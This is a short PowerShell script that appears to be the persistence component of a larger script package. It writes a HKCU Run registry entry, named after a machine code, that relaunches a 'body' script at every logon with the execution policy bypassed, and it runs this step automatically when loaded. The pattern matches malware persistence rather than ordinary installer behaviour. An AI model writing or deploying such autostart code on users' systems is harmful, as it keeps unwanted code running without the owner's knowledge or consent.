. ./utils.ps1
. ./consts_body.ps1

function Add-BodyToStartup {
    
    $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $keyName = Get-MachineCode
    $bodyPath = Get-BodyPath
    $value = "powershell.exe -ExecutionPolicy Bypass -File `"$bodyPath`" -ArgumentList '-autostart true'"

    RegWrite -registryPath $registryPath -keyName $keyName -value $value
}

function do_autoregistry {
    $autoStart = RegReadParamBool -keyName "autoStart" -default $true
    if (-not $autoStart)
    {
        writedbg "Skipping autostart..."
        return
    } 
    else 
    {
            writedbg "Setting autostart..."
    }
    try 
    {
        Add-BodyToStartup
    } catch {
        writedbg "Error  DoRegistryAutoStart $_"
    }
}

do_autoregistry